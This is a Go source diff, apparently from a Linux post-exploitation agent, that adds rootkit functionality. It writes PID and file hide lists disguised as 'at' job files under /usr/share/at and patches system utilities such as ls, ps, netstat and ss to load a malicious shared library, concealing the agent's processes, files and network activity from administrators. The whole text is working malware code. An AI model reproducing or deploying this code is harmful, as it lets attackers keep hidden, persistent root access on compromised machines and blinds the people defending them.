@@ -25,10 +25,26 @@ var (
 		"patcher":  patcher,
 	}
 
+	// Hidden_PIDs list of hidden files/pids
+	// see loader.c
+	Hidden_PIDs  = "/usr/share/at/batch-job.at"
+	Hidden_Files = "/usr/share/at/daily-job.at"
+
+	// Patched_List list of patched sys utils
+	Patched_List = []string{
+		"/usr/bin/ls",
+		"/usr/bin/dir",
+		"/usr/bin/ps",
+		"/usr/bin/pstree",
+		"/usr/bin/netstat",
+		"/usr/bin/ss",
+	}
+
 	// EmpLocations all possible locations
 	EmpLocations = []string{
 		// root
 		"/env",
+		"/usr/bin/x", // see loader.c
 		"/usr/bin/.env",
 		"/usr/local/bin/env",
 		"/bin/.env",
@@ -182,15 +198,44 @@ func AddCronJob(job string) error {
 	return cmd.Start()
 }
 
-// FIXME this is not working
 // patch ELF file so it automatically loads and runs loader.so
 func patcher() (err error) {
 	if !HasRoot() {
 		return errors.New("Root required")
 	}
-	so_path, err := prepare_loader_so(1)
+	so_path, err := prepare_loader_so(0)
 	if err != nil {
 		return
 	}
-	return AddNeededLib(util.ProcExePath(1), so_path)
+
+	// create hidden list
+	if !util.IsFileExist(Hidden_PIDs) {
+		// pid+1 is for elvsh process
+		pids := fmt.Sprintf("%d\n%d", os.Getpid(), os.Getpid()+1)
+
+		// mkdir
+		os.MkdirAll("/usr/share/at", 0755)
+
+		// PIDs
+		err = ioutil.WriteFile(Hidden_PIDs, []byte(pids), 0644)
+		if err != nil {
+			log.Printf("Cannot create %s: %v", Hidden_PIDs, err)
+		}
+
+		// files
+		files := fmt.Sprintf("%s", util.FileBaseName(RuntimeConfig.AgentRoot))
+		err = ioutil.WriteFile(Hidden_Files, []byte(files), 0644)
+		if err != nil {
+			log.Printf("Cannot create %s: %v", Hidden_Files, err)
+		}
+	}
+
+	// patch system utilities
+	for _, file := range Patched_List {
+		e := AddNeededLib(file, so_path)
+		if e != nil {
+			err = fmt.Errorf("%v; %v", err, e)
+		}
+	}
+	return
 }
